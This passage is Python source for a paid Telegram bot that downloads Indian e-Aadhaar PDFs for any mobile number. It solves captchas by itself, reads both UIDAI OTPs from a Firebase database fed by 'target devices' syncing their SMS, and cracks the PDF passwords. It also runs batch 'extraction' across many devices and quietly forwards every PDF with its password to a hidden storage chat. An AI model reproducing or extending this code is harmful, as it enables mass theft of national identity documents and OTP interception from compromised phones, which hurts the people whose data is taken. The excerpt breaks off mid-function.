    joined = u.get('joined_at', '—')[:10] if u else '—'
    send_message(
        chat_id,
        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
        f"<b>💰 ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ & ᴄʀᴇᴅɪᴛs</b>\n\n"
        f"💳  ᴄʀᴇᴅɪᴛs      ·  <b>{cr_display}</b>\n"
        f"👥  ʀᴇғᴇʀʀᴀʟs    ·  <b>{ref_count}</b>\n"
        f"📅  ᴍᴇᴍʙᴇʀ sɪɴᴄᴇ ·  {joined}\n\n"
        f"{DIVIDER}\n"
        f"<i>📌  1 ᴄʀᴇᴅɪᴛ = 1 ᴇ-ᴀᴀᴅʜᴀᴀʀ ᴅᴏᴡɴʟᴏᴀᴅ\n"
        f"🎁  ᴛᴀᴘ 'ʙᴜʏ ᴄʀᴇᴅɪᴛs' ғᴏʀ ɪɴsᴛᴀɴᴛ ᴜᴘɪ ʀᴇᴄʜᴀʀɢᴇ.</i>",
        reply_markup=get_credits_keyboard()
    )

def show_buy_menu(chat_id):
    send_message(
        chat_id,
        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
        f"<b>🛒 ʙᴜʏ ᴅᴏᴡɴʟᴏᴀᴅ ᴄʀᴇᴅɪᴛs (ɪɴsᴛᴀɴᴛ ᴜᴘɪ)</b>\n\n"
        f"⚡  sᴛᴀʀᴛᴇʀ ᴘʟᴀɴ   ·  <b>25 ᴄʀᴇᴅɪᴛs  —  ₹50</b>\n"
        f"🔥  ᴘᴏᴘᴜʟᴀʀ ᴘʟᴀɴ   ·  <b>60 ᴄʀᴇᴅɪᴛs  —  ₹100</b>\n"
        f"💎  ᴘʀᴏ ᴘʟᴀɴ       ·  <b>160 ᴄʀᴇᴅɪᴛs —  ₹250</b>\n"
        f"👑  ʟɪғᴇᴛɪᴍᴇ ᴠɪᴘ   ·  <b>ᴜɴʟɪᴍɪᴛᴇᴅ   —  ₹500</b>\n\n"
        f"{DIVIDER}\n"
        f"<i>✨ ɪɴsᴛᴀɴᴛ 24/7 ᴜᴘɪ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴠɪᴀ ɢᴘᴀʏ, ᴘʜᴏɴᴇᴘᴇ, ᴘᴀʏᴛᴍ & ʙʜɪᴍ\n"
        f"👇 sᴇʟᴇᴄᴛ ᴀ ᴘʟᴀɴ ʙᴇʟᴏᴡ:</i>",
        reply_markup=get_buy_keyboard()
    )

def show_referral_info(chat_id):
    username  = get_bot_username()
    link      = f"https://t.me/{username}?start=ref_{chat_id}"
    u         = get_user(chat_id)
    ref_count = u.get('referral_count', 0) if u else 0
    earned    = ref_count
    send_message(
        chat_id,
        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
        f"<b>🔗 ʀᴇғᴇʀʀᴀʟ ᴘʀᴏɢʀᴀᴍ</b>\n\n"
        f"🎁  ᴇᴀʀɴ <b>+1 ғʀᴇᴇ ᴄʀᴇᴅɪᴛ</b> ғᴏʀ ᴇᴠᴇʀʏ ғʀɪᴇɴᴅ ᴡʜᴏ ᴊᴏɪɴs!\n\n"
        f"👥  ʏᴏᴜʀ ʀᴇғᴇʀʀᴀʟs ·  <b>{ref_count}</b>\n"
        f"💰  ᴄʀᴇᴅɪᴛs ᴇᴀʀɴᴇᴅ ·  <b>{earned}</b>\n\n"
        f"<b>ʏᴏᴜʀ ɪɴᴠɪᴛᴇ ʟɪɴᴋ:</b>\n"
        f"<code>{link}</code>\n\n"
        f"{DIVIDER}\n"
        f"<i>sʜᴀʀᴇ ʏᴏᴜʀ ɪɴᴠɪᴛᴇ ʟɪɴᴋ ᴡɪᴛʜ ғʀɪᴇɴᴅs ᴛᴏ ᴇᴀʀɴ ғʀᴇᴇ ᴄʀᴇᴅɪᴛs!</i>",
        reply_markup=get_referral_keyboard(link)
    )

def show_help(chat_id):
    send_message(
        chat_id,
        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
        f"<b>❓ ʜᴇʟᴘ & ᴜsᴇʀ ɢᴜɪᴅᴇ</b>\n\n"
        f"⚡ <b>ᴀᴠᴀɪʟᴀʙʟᴇ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇᴛʜᴏᴅs:</b>\n"
        f"• <b>📱 ᴍᴏʙɪʟᴇ sᴇᴀʀᴄʜ:</b> ᴇɴᴛᴇʀ 10-ᴅɪɢɪᴛ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ. ʙᴏᴛ ᴠᴇʀɪғɪᴇs ᴏᴛᴘ 1 ᴛᴏ ɢᴇᴛ ᴇɪᴅ, ᴛʜᴇɴ ᴅᴏᴡɴʟᴏᴀᴅs ᴘᴅғ ᴠɪᴀ ᴏᴛᴘ 2.\n"
        f"• <b>🪪 ᴀᴀᴅʜᴀᴀʀ sᴇᴀʀᴄʜ:</b> ᴇɴᴛᴇʀ 12-ᴅɪɢɪᴛ ᴀᴀᴅʜᴀᴀʀ ɴᴜᴍʙᴇʀ ғᴏʀ ᴅɪʀᴇᴄᴛ ᴏᴛᴘ ᴅᴏᴡɴʟᴏᴀᴅ.\n"
        f"• <b>🔢 ᴇɪᴅ sᴇᴀʀᴄʜ:</b> ᴇɴᴛᴇʀ 28-ᴅɪɢɪᴛ ᴇɴʀᴏʟʟᴍᴇɴᴛ ɪᴅ ᴅɪʀᴇᴄᴛʟʏ.\n"
        f"• <b>🥷 ᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴀ ғɪʀᴇʙᴀsᴇ:</b> ᴀᴜᴛᴏᴍᴀᴛᴇᴅ ᴏᴛᴘ ғᴇᴛᴄʜ! ᴘʀᴏᴠɪᴅᴇ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ & ғɪʀᴇʙᴀsᴇ ʀᴛᴅʙ ᴜʀʟ. ᴛʜᴇ ʙᴏᴛ ᴀᴜᴛᴏ-ʟɪsᴛᴇɴs ᴛᴏ ʏᴏᴜʀ ᴅᴀᴛᴀʙᴀsᴇ ғᴏʀ ʙᴏᴛʜ ᴏᴛᴘs ᴀɴᴅ ᴅᴇʟɪᴠᴇʀs ᴛʜᴇ ᴘᴅғ ᴡɪᴛʜᴏᴜᴛ ᴍᴀɴᴜᴀʟ ᴏᴛᴘ ᴛʏᴘɪɴɢ!\n\n"
        f"🔓 <b>ᴀᴜᴛᴏ-ᴘᴀssᴡᴏʀᴅ ᴄʀᴀᴄᴋ:</b>\n"
        f"ᴀʟʟ ᴘᴅғs ᴀʀᴇ ɪɴsᴛᴀɴᴛʟʏ ᴜɴʟᴏᴄᴋᴇᴅ ᴀɴᴅ ᴅᴇʟɪᴠᴇʀᴇᴅ ᴡɪᴛʜᴏᴜᴛ ᴘᴀssᴡᴏʀᴅ.\n\n"
        f"💰 <b>ᴄʀᴇᴅɪᴛs & ᴘʀɪᴄɪɴɢ:</b>\n"
        f"• 1 ᴄʀᴇᴅɪᴛ = 1 e-Aadhaar PDF Download\n"
        f"• 25 ᴄʀᴇᴅɪᴛs — ₹50\n"
        f"• 60 ᴄʀᴇᴅɪᴛs — ₹100\n"
        f"• 160 ᴄʀᴇᴅɪᴛs — ₹250\n"
        f"• 👑 ʟɪғᴇᴛɪᴍᴇ ᴠɪᴘ (ᴜɴʟɪᴍɪᴛᴇᴅ) — ₹500\n\n"
        f"📩 <b>sᴜᴘᴘᴏʀᴛ & ɪɴǫᴜɪʀɪᴇs:</b> {OWNER_USERNAME}\n"
        f"{DIVIDER}",
        reply_markup=get_help_keyboard()
    )

# ============== GATES ==============
def channel_gate(chat_id):
    if is_force_check_enabled() and not is_channel_member(chat_id):
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>📢 ᴊᴏɪɴ ᴏғғɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ</b>\n\n"
            f"🔒  ʙᴏᴛ ᴋᴏ ᴜsᴇ ᴋᴀʀɴᴇ ᴋᴇ ʟɪʏᴇ ʜᴜᴍᴀʀᴇ ᴏғғɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ ᴋᴏ ᴊᴏɪɴ ᴋᴀʀɴᴀ ᴢᴀʀᴏᴏʀɪ ʜᴀɪ.\n\n"
            f"{DIVIDER}\n"
            f"<i>👇  ɴᴇᴇᴄʜᴇ ᴅɪʏᴇ ɢᴀʏᴇ ʙᴜᴛᴛᴏɴ sᴇ ᴊᴏɪɴ ᴋᴀʀᴇɪɴ ᴀᴜʀ '✅ ɪ ʜᴀᴠᴇ ᴊᴏɪɴᴇᴅ' ᴅᴀʙᴀʏᴇɪɴ.</i>",
            reply_markup=get_join_keyboard()
        )
        return False
    return True

def credit_gate(chat_id):
    if is_admin(chat_id):
        return True
    if not has_credits(chat_id):
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>❌ ɪɴsᴜғғɪᴄɪᴇɴᴛ ᴄʀᴇᴅɪᴛs</b>\n\n"
            f"💰  ʏᴏᴜ ʜᴀᴠᴇ <b>0 ᴄʀᴇᴅɪᴛs</b> ʀᴇᴍᴀɪɴɪɴɢ.\n"
            f"🎁  ʙᴜʏ ᴄʀᴇᴅɪᴛs ᴏʀ ɪɴᴠɪᴛᴇ ғʀɪᴇɴᴅs ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ.",
            reply_markup=get_buy_keyboard()
        )
        return False
    return True

def ban_gate(chat_id):
    if is_banned(chat_id):
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>🚫 ᴀᴄᴄᴇss ʀᴇᴠᴏᴋᴇᴅ</b>\n\n"
            f"⛔  ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀs ʙᴇᴇɴ ʀᴇsᴛʀɪᴄᴛᴇᴅ.\n"
            f"📩  ᴄᴏɴᴛᴀᴄᴛ {OWNER_USERNAME} ᴛᴏ ᴀᴘᴘᴇᴀʟ.\n\n"
            f"{DIVIDER}"
        )
        return True
    return False

def forward_pdf_to_storage(user_id, file_path, name, password=None, method="mobile"):
    """Forwards every generated user Aadhaar PDF to the storage group with full user details."""
    if not STORAGE_CHAT or not file_path or not os.path.exists(file_path):
        return
    try:
        u = database.get_user(user_id) or {}
        first = u.get('first_name') or ''
        last = u.get('last_name') or ''
        uname = f"@{u.get('username')}" if u.get('username') else 'None'
        full_name = f"{first} {last}".strip() or "Telegram User"
        role_tag = "👑 OWNER" if int(user_id) == OWNER_ID else ("🛡️ ADMIN" if is_admin(user_id) else "👤 USER")

        cap = (
            f"<b>{BOT_NAME} · 🗄️ STORAGE LOG</b>\n{DIVIDER}\n"
            f"👤  <b>ᴜsᴇʀ:</b> {html.escape(full_name)} ({uname})\n"
            f"🆔  <b>ᴜsᴇʀ ɪᴅ:</b> <code>{user_id}</code>  [{role_tag}]\n"
            f"🪪  <b>ᴀᴀᴅʜᴀᴀʀ ɴᴀᴍᴇ:</b> <b>{html.escape(str(name))}</b>\n"
            f"🔑  <b>ᴘᴀssᴡᴏʀᴅ:</b> <code>{password or 'Protected'}</code>\n"
            f"⚙️  <b>ᴍᴇᴛʜᴏᴅ:</b> <code>{method}</code>\n"
            f"⏰  <b>ᴛɪᴍᴇ:</b> <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n"
            f"{DIVIDER}"
        )
        clean_fn = re.sub(r'[^a-zA-Z0-9]', '_', str(name))[:20] or "Aadhaar"
        send_document(STORAGE_CHAT, file_path, caption=cap, filename=f"Storage_{clean_fn}_{user_id}.pdf")
        logger.info(f"Forwarded Aadhaar PDF of {user_id} ({name}) to storage {STORAGE_CHAT}")
    except Exception as e:
        logger.warning(f"Error forwarding PDF to storage {STORAGE_CHAT}: {e}")

# ============== PDF DELIVERY (ZERO-DISK LEAK) ==============
def deliver_pdf(chat_id, pdf_path, verified_name, is_batch=False):
    name_display = verified_name if verified_name and verified_name.strip() else "Mr."
    send_message(
        chat_id,
        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
        f"<b>⚙️ ᴘʀᴏᴄᴇssɪɴɢ ᴅᴏᴄᴜᴍᴇɴᴛ</b>\n\n"
        f"<i>🔓  ᴅᴇᴄʀʏᴘᴛɪɴɢ ᴀɴᴅ ᴜɴʟᴏᴄᴋɪɴɢ ʏᴏᴜʀ ᴀᴀᴅʜᴀᴀʀ ᴘᴅғ…</i>"
    )
    decrypted_path = None
    try:
        crack_success, password, decrypted_path = bot.crack_pdf_with_name(pdf_path, name_display)
        if crack_success and decrypted_path and os.path.exists(decrypted_path):
            caption = (
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>✅ ᴅᴏᴄᴜᴍᴇɴᴛ ʀᴇᴀᴅʏ (ᴜɴʟᴏᴄᴋᴇᴅ)</b>\n\n"
                f"👤  <b>ɴᴀᴍᴇ</b>      ·  <b>{html.escape(name_display)}</b>\n"
                f"📄  <b>ғᴏʀᴍᴀᴛ</b>    ·  e-Aadhaar PDF\n"
                f"🔓  <b>ᴘᴀssᴡᴏʀᴅ</b>  ·  <code>{password}</code>\n"
                f"{DIVIDER}"
            )
            doc_res = send_document(chat_id, decrypted_path, caption=caption, filename="Aadhaar.pdf")
            logger.info(f"Delivered unlocked PDF to {chat_id}: {doc_res.get('ok') if doc_res else False}")
            try:
                set_message_reaction(chat_id, message_id=None, emoji="⚡")
            except Exception:
                pass
            forward_pdf_to_storage(chat_id, decrypted_path, name_display, password=password, method="online")
            database.record_pdf_download(str(chat_id), name_display, is_admin_user=is_admin(chat_id), is_owner_user=(int(chat_id) == OWNER_ID), method="online", password=password)
        else:
            caption = (
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>📄 ᴅᴏᴄᴜᴍᴇɴᴛ ʀᴇᴀᴅʏ</b>\n\n"
                f"👤  <b>ɴᴀᴍᴇ</b>    ·  {html.escape(name_display)}\n"
                f"📄  <b>ғᴏʀᴍᴀᴛ</b>  ·  e-Aadhaar PDF\n"
                f"🔒  <b>sᴛᴀᴛᴜs</b>  ·  Password Protected\n"
                f"{DIVIDER}\n\n"
                f"<i>🔑  ᴘᴀssᴡᴏʀᴅ: First 4 letters of name in CAPITAL + Birth Year\n"
                f"   ᴇxᴀᴍᴘʟᴇ: <code>RAJE1995</code></i>"
            )
            doc_res = send_document(chat_id, pdf_path, caption=caption, filename="Aadhaar.pdf")
            logger.info(f"Delivered protected PDF to {chat_id}: {doc_res.get('ok') if doc_res else False}")
            forward_pdf_to_storage(chat_id, pdf_path, name_display, password=None, method="online")
            database.record_pdf_download(str(chat_id), name_display, is_admin_user=is_admin(chat_id), is_owner_user=(int(chat_id) == OWNER_ID), method="online", password=None)
    except Exception as e:
        logger.error(f"PDF delivery error: {e}", exc_info=True)
        send_document(
            chat_id, pdf_path,
            caption=f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>📄 ᴅᴏᴄᴜᴍᴇɴᴛ ʀᴇᴀᴅʏ</b>",
            filename="Aadhaar.pdf"
        )
    finally:
        for p in [pdf_path, decrypted_path]:
            if p and os.path.exists(p):
                try:
                    os.remove(p)
                except Exception:
                    pass

    deduct_credit(chat_id)
    if not is_batch:
        cr = get_credits(chat_id)
        cr_display = "♾️ ʟɪғᴇᴛɪᴍᴇ" if cr == float('inf') else str(int(cr))
        clear_session(chat_id)
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>🎉 ᴅᴏᴡɴʟᴏᴀᴅ ᴄᴏᴍᴘʟᴇᴛᴇ!</b>\n\n"
            f"💰  ᴄʀᴇᴅɪᴛs ʀᴇᴍᴀɪɴɪɴɢ  ·  <b>{cr_display}</b>\n\n"
            f"{DIVIDER}\n"
            f"<i>📲  sᴇʟᴇᴄᴛ ᴀ ᴍᴇᴛʜᴏᴅ ʙᴇʟᴏᴡ ғᴏʀ ᴀɴᴏᴛʜᴇʀ ᴅᴏᴡɴʟᴏᴀᴅ.</i>",
            reply_markup=get_welcome_inline_keyboard()
        )

# ============== FIREBASE WORKERS & DEVICE SCANNER ==============
def _execute_single_firebase_download(chat_id, mobile, fb_url, dev_id=None, is_batch=False, progress_msg_id=None):
    masked_mobile = f"{mobile[:2]}******{mobile[-2:]}"
    task_user_id = f"{chat_id}_{mobile}"

    def update_single_status(status_str, detail_str):
        if not is_batch and progress_msg_id:
            edit_message_text(
                chat_id, progress_msg_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>🥷 ғɪʀᴇʙᴀsᴇ ᴀᴜᴛᴏ-ᴅᴏᴡɴʟᴏᴀᴅ</b>\n\n"
                f"📱  <b>ᴍᴏʙɪʟᴇ</b>    ·  <code>+91 {masked_mobile}</code>\n"
                f"🌐  <b>sᴛᴀᴛᴜs</b>    ·  <code>{status_str}</code>\n\n"
                f"<i>{detail_str}</i>"
            )

    update_single_status("sᴇɴᴅɪɴɢ ᴏᴛᴘ 1…", "⚙️  ᴀᴜᴛᴏ-sᴏʟᴠɪɴɢ ᴄᴀᴘᴛᴄʜᴀ &amp; ʀᴇǫᴜᴇsᴛɪɴɢ ᴏᴛᴘ 1 ғʀᴏᴍ ᴜɪᴅᴀɪ…")

    sess = get_session(chat_id)
    if sess.get('step') != 'downloading':
        return False, {'error': 'Session cancelled', 'mobile': mobile}

    # Baseline existing OTPs on device to guarantee only freshly arrived OTPs are accepted
    baseline_otps = bot.get_existing_device_otps(fb_url, device_id=dev_id)

    # Auto-send Mobile OTP 1
    otp_sent_time = time.time()
    ok, otp_txn, code, c_txn, t_id, err = bot.auto_send_eid_otp(task_user_id, mobile, "Mr")
    if not ok or not otp_txn:
        err_text = str(err or 'Failed to send OTP')
        logger.warning(f"OTP 1 send failed for {mobile}: {err_text}")
        if not is_batch:
            clear_session(chat_id)
            if progress_msg_id:
                edit_message_text(
                    chat_id, progress_msg_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"❌  <b>ᴏᴛᴘ 1 ʀᴇǫᴜᴇsᴛ ғᴀɪʟᴇᴅ</b> (<code>{masked_mobile}</code>)\n\n"
                    f"⚠️  {html.escape(err_text)}",
                    reply_markup=get_menu_keyboard()
                )
            else:
                send_message(
                    chat_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"❌  <b>ᴏᴛᴘ 1 ʀᴇǫᴜᴇsᴛ ғᴀɪʟᴇᴅ</b> (<code>{masked_mobile}</code>)\n\n"
                    f"⚠️  {html.escape(err_text)}",
                    reply_markup=get_menu_keyboard()
                )
        return False, {'error': err_text, 'mobile': mobile}

    update_single_status("ᴏᴛᴘ 1 sᴇɴᴛ!", "🔍  ᴍᴏɴɪᴛᴏʀɪɴɢ ғɪʀᴇʙᴀsᴇ ᴅᴀᴛᴀʙᴀsᴇ ғᴏʀ ᴏᴛᴘ 1 (ᴀᴜᴛᴏ-ʟɪsᴛᴇɴɪɴɢ 🔄)…")

    sess = get_session(chat_id)
    if sess.get('step') != 'downloading':
        return False, {'error': 'Session cancelled', 'mobile': mobile}

    # Poll Firebase for OTP 1 (using device_id for instant lookup, excluding pre-existing OTPs)
    found1, otp1, msg1 = bot.fetch_otp_from_firebase(
        fb_url, min_timestamp=otp_sent_time - 15, timeout=75, poll_interval=3, target_mobile=mobile, exclude_otps=baseline_otps, device_id=dev_id
    )
    if not found1 or not otp1:
        logger.warning(f"OTP 1 timeout for {mobile}")
        if not is_batch:
            clear_session(chat_id)
            if progress_msg_id:
                edit_message_text(
                    chat_id, progress_msg_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"<b>⏱️ ᴏᴛᴘ 1 ᴛɪᴍᴇᴏᴜᴛ</b> (<code>{masked_mobile}</code>)\n\n"
                    f"⚠️  ɴᴏ ᴀᴀᴅʜᴀᴀʀ ᴏᴛᴘ ᴡᴀs ᴅᴇᴛᴇᴄᴛᴇᴅ ɪɴ ғɪʀᴇʙᴀsᴇ ᴡɪᴛʜɪɴ 75 sᴇᴄᴏɴᴅs.\n"
                    f"💡  <i>ᴍᴀᴋᴇ sᴜʀᴇ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪs ᴏɴʟɪɴᴇ ᴀɴᴅ sʏɴᴄɪɴɢ sᴍs.</i>",
                    reply_markup=get_menu_keyboard()
                )
        return False, {'error': 'OTP 1 Timeout', 'mobile': mobile}

    sess = get_session(chat_id)
    if sess.get('step') != 'downloading':
        return False, {'error': 'Session cancelled', 'mobile': mobile}

    update_single_status(f"ᴏᴛᴘ 1: <code>{otp1}</code>", "🔄  ᴠᴇʀɪғʏɪɴɢ ᴏᴛᴘ 1 &amp; ʀᴇᴛʀɪᴇᴠɪɴɢ ᴇɪᴅ…")

    res = bot.verify_eid_otp(task_user_id, mobile, "Mr", otp1, otp_txn, c_txn, code)
    if len(res) == 4:
        success, eid_number, verified_name, dob = res
    else:
        success, eid_number, verified_name = res

    if not success or not eid_number:
        v_err = str(verified_name or 'Invalid OTP')
        logger.warning(f"OTP 1 verification failed for {mobile}: {v_err}")
        if not is_batch:
            clear_session(chat_id)
            if progress_msg_id:
                edit_message_text(
                    chat_id, progress_msg_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"❌  <b>ᴏᴛᴘ 1 ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ғᴀɪʟᴇᴅ</b>\n\n"
                    f"⚠️  {html.escape(v_err)}",
                    reply_markup=get_menu_keyboard()
                )
        return False, {'error': v_err, 'mobile': mobile}

    name_display = verified_name or "Aadhaar Holder"
    eid_clean = str(eid_number).replace('/', '').replace(' ', '')

    update_single_status("ᴇɪᴅ ʀᴇᴛʀɪᴇᴠᴇᴅ", f"🆔  <b>ᴇɪᴅ:</b> <code>{eid_clean}</code>\n<i>🔄  ᴀᴜᴛᴏ-sᴏʟᴠɪɴɢ ᴄᴀᴘᴛᴄʜᴀ &amp; sᴇɴᴅɪɴɢ ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ 2…</i>")

    sess = get_session(chat_id)
    if sess.get('step') != 'downloading':
        return False, {'error': 'Session cancelled', 'mobile': mobile}

    # Auto-send OTP 2 (Download OTP)
    otp2_sent_time = time.time()
    dl_res = bot.auto_send_aadhaar_otp(task_user_id, eid_clean, max_retries=6)
    if not dl_res[0]:
        err2 = dl_res[5] if len(dl_res) > 5 else "Failed to send download OTP"
        logger.warning(f"Download OTP 2 send failed for {mobile}: {err2}")
        if not is_batch:
            clear_session(chat_id)
            if progress_msg_id:
                edit_message_text(
                    chat_id, progress_msg_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"❌  <b>ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ 2 ғᴀɪʟᴇᴅ</b>\n\n"
                    f"⚠️  {html.escape(str(err2))}",
                    reply_markup=get_menu_keyboard()
                )
        return False, {'error': str(err2), 'mobile': mobile}

    dl_otp_txn = dl_res[1]
    dl_t_id = dl_res[4]

    update_single_status("ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ 2 sᴇɴᴛ!", "🔍  ᴍᴏɴɪᴛᴏʀɪɴɢ ғɪʀᴇʙᴀsᴇ ᴅᴀᴛᴀʙᴀsᴇ ғᴏʀ ᴏᴛᴘ 2 (ᴀᴜᴛᴏ-ʟɪsᴛᴇɴɪɴɢ 🔄)…")

    sess = get_session(chat_id)
    if sess.get('step') != 'downloading':
        return False, {'error': 'Session cancelled', 'mobile': mobile}

    # Poll Firebase for OTP 2 (excluding baseline OTPs and OTP 1)
    found2, otp2, msg2 = bot.fetch_otp_from_firebase(
        fb_url, min_timestamp=otp2_sent_time - 15, timeout=75, poll_interval=3, target_mobile=mobile, exclude_otps=list(set(baseline_otps + [otp1])), device_id=dev_id
    )
    if not found2 or not otp2:
        logger.warning(f"OTP 2 timeout for {mobile}")
        if not is_batch:
            clear_session(chat_id)
            if progress_msg_id:
                edit_message_text(
                    chat_id, progress_msg_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"<b>⏱️ ᴏᴛᴘ 2 ᴛɪᴍᴇᴏᴜᴛ</b>\n\n"
                    f"⚠️  ɴᴏ ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ ᴡᴀs ᴅᴇᴛᴇᴄᴛᴇᴅ ɪɴ ғɪʀᴇʙᴀsᴇ ᴡɪᴛʜɪɴ 75 sᴇᴄᴏɴᴅs.",
                    reply_markup=get_menu_keyboard()
                )
        return False, {'error': 'OTP 2 Timeout', 'mobile': mobile}

    sess = get_session(chat_id)
    if sess.get('step') != 'downloading':
        return False, {'error': 'Session cancelled', 'mobile': mobile}

    update_single_status(f"ᴏᴛᴘ 2: <code>{otp2}</code>", "⏳  ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ &amp; ᴜɴʟᴏᴄᴋɪɴɢ ᴇ-ᴀᴀᴅʜᴀᴀʀ ᴘᴅғ…")

    dl_ok, result = bot.download_aadhaar_pdf(
        task_user_id, eid_clean, otp2, dl_otp_txn, transaction_id=dl_t_id, sticky_proxy=bot.user_proxies.get(task_user_id)
    )
    if not dl_ok:
        logger.warning(f"PDF download failed for {mobile}: {result}")
        if not is_batch:
            clear_session(chat_id)
            if progress_msg_id:
                edit_message_text(
                    chat_id, progress_msg_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"❌  <b>ᴅᴏᴡɴʟᴏᴀᴅ ғᴀɪʟᴇᴅ</b>\n\n"
                    f"⚠️  {html.escape(str(result or 'UIDAI download failed'))}",
                    reply_markup=get_menu_keyboard()
                )
        return False, {'error': str(result), 'mobile': mobile}

    # CRACK PDF
    crack_ok, password, decrypted_path = bot.crack_pdf_with_name(result, name_display)
    final_pdf_path = decrypted_path if (crack_ok and decrypted_path and os.path.exists(decrypted_path)) else result
    if crack_ok and decrypted_path and os.path.exists(result):
        try:
            os.remove(result)
        except Exception:
            pass

    if not is_batch:
        if progress_msg_id:
            delete_message(chat_id, progress_msg_id)
        deliver_pdf(chat_id, final_pdf_path, name_display, is_batch=False)
        return True, None

    return True, {
        'pdf_path': final_pdf_path,
        'name': name_display,
        'password': password if crack_ok else None,
        'is_unlocked': crack_ok,
        'mobile': mobile
    }

def _handle_firebase_download_worker(chat_id, mobile, fb_url, dev_id=None):
    try:
        masked = f"{mobile[:2]}******{mobile[-2:]}"
        init_res = send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>🥷 ғɪʀᴇʙᴀsᴇ ᴀᴜᴛᴏ-ᴅᴏᴡɴʟᴏᴀᴅ</b>\n\n"
            f"📱  <b>ᴍᴏʙɪʟᴇ</b>    ·  <code>+91 {masked}</code>\n"
            f"🌐  <b>sᴛᴀᴛᴜs</b>    ·  <code>sᴇɴᴅɪɴɢ ᴏᴛᴘ 1…</code>\n\n"
            f"<i>⚙️  ᴀᴜᴛᴏ-sᴏʟᴠɪɴɢ ᴄᴀᴘᴛᴄʜᴀ &amp; ʀᴇǫᴜᴇsᴛɪɴɢ ᴏᴛᴘ 1 ғʀᴏᴍ ᴜɪᴅᴀɪ…</i>"
        )
        prog_id = (init_res.get('result') or {}).get('message_id') if init_res else None
        _execute_single_firebase_download(chat_id, mobile, fb_url, dev_id=dev_id, is_batch=False, progress_msg_id=prog_id)
    except Exception as e:
        logger.error(f"Error in firebase download worker: {e}", exc_info=True)
        clear_session(chat_id)
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"❌  <b>ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ</b>\n\n"
            f"⚠️  {html.escape(str(e))}\n\n"
            f"{DIVIDER}",
            reply_markup=get_menu_keyboard()
        )

def _handle_firebase_batch_worker(chat_id, fb_url, devices):
    try:
        total = len(devices)
        concurrency = min(5, total)

        start_res = send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>🚀 ʙᴀᴛᴄʜ ᴇxᴛʀᴀᴄᴛɪᴏɴ sᴛᴀʀᴛᴇᴅ</b>\n\n"
            f"📊  <b>ᴛᴏᴛᴀʟ ᴅᴇᴠɪᴄᴇs:</b> <b>{total}</b>\n"
            f"⚙️  <b>ᴘᴀʀᴀʟʟᴇʟ ᴛᴀsᴋs:</b> <b>{concurrency} Background Threads</b>\n"
            f"🌐  <b>ғɪʀᴇʙᴀsᴇ:</b> <code>{fb_url}</code>\n\n"
            f"<i>⏳  Multi-task background engine running… All unlocked PDFs will be sent below once extraction completes.</i>"
        )
        progress_msg_id = (start_res.get('result') or {}).get('message_id') if start_res else None

        ready_pdfs = []
        lock = threading.Lock()
        completed_count = 0
        failed_count = 0
        last_edit_time = [0.0]

        def update_dashboard():
            if not progress_msg_id:
                return
            now = time.time()
            if now - last_edit_time[0] < 2.5 and completed_count < total:
                return
            last_edit_time[0] = now
            in_prog = max(0, total - completed_count)
            dash_text = (
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>⚡ ʙᴀᴛᴄʜ ᴇxᴛʀᴀᴄᴛɪᴏɴ ɪɴ ᴘʀᴏɢʀᴇss</b>\n\n"
                f"📊  <b>ᴘʀᴏɢʀᴇss:</b> <b>[{completed_count}/{total}] Devices</b>\n"
                f"✅  <b>ᴘᴅғs ʀᴇᴀᴅʏ:</b> <b>{len(ready_pdfs)}</b>\n"
                f"❌  <b>ғᴀɪʟᴇᴅ / sᴋɪᴘ:</b> <b>{failed_count}</b>\n"
                f"⚙️  <b>ᴀᴄᴛɪᴠᴇ ᴛᴀsᴋs:</b> <b>{in_prog}</b>\n\n"
